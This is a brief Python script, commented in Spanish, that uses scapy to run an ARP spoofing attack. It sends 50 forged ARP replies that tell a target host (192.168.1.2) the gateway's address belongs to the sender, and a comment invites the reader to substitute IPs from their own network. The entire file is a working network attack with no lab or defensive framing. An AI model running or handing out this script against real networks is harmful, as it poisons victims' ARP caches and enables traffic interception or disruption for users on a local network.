from scapy.all import send, ARP, getmacbyip
import time

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    arp_reply = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')

    print(f"Iniciando ARP spoofing contra {target_ip}")
    for _ in range(50):  # Envía 50 paquetes
        send(arp_reply, verbose=False)
        time.sleep(0.2)
    print("ARP spoofing finalizado")

# Reemplaza estas IP con las de tu red local
arp_spoof("192.168.1.2", "192.168.1.1")
